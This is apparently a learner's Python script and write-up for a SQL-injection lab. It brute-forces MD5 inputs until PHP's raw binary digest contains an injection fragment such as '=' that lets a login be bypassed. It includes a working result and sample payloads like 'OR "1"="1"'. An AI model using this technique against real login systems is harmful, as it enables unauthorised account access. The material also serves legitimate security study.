'''
I attempted to create a C program first. It didn't go well. So, I returned to my comfort zone with Python.
    * This program was created and ran on my WIN11 machine, using python v 3.11.3
    * I elected to use hashlib since it is part of the Standard Library.
    * I included time for curiosities sake.

For simplicity, the input string to be hashed is just an incrementing `int` (str_in), converted to `str`.

From: https://www.php.net/manual/en/function.md5.php > I learned that `md5( ,true);` returns "the md5 digest in raw binary format."
    * Raw binary can contain any byte value, meaning that a particular hash may contain a certain, desired substring.

I had no clue how long it would take to iterate hashes until the raw binary contained a valid injection substring -
but I did know that the shorter I could make it, the better - so:

Starting with: 'OR "1"="1"' then a few (many) rounds of blind elimination -
    I determined that '=' was the smallest inject in sql_0 that I could sign in as victim.
     
I was pleasantly surprised by the results:
   "inject: [ 1839431 ] | from: [ b"\xc37\x90\xa5\xaf\xc4\xb1A@J\xbe'='\xaa\xa9" ] | time: [ 1.2804677486419678 ]"

I decided to implement user input ASCII injection strings (from CLI with `sys`) for encoding.
    The first string I tried was 'or 1=1# but, I killed the process after a couple of minutes.
    The second string I tried was '='# but, I similarly killed the process.
    While hardly scientific, this proved to be a practical example of "Avalanching"
    
'''
import hashlib
import time
import sys

def hasher(inject):
    start_time = time.time()
    str_in = 0
    while True:
        str_in += 1 # increment str_in by 1, each loop
        
        m = hashlib.md5() # instantiate the md5 function as `m`

        '''
        call the `hashlib` method `update` using `md5` to "update the hash object with bytes-like object";
        `.encode()` to convert str(str_in) to bytes.
        '''
        m.update(str(str_in).encode())
        
        d = m.digest() # `digest()` returns the bytes object "digest" from `update()` containing binary encoded hexadecimal characters.
        
        if inject.encode() in d: # 'encode' the str `inject` for comparison of bytes in `d` digest.
            print(f'inject: [ {str_in} ] | from: [ {d} ] | time: [ {time.time() - start_time} ]')
            break


if __name__ == '__main__':
    # slice `hasher.py` from sys.argv and join on space, store in inject
    inject = ' '.join(sys.argv[1:])    
    hasher(inject)

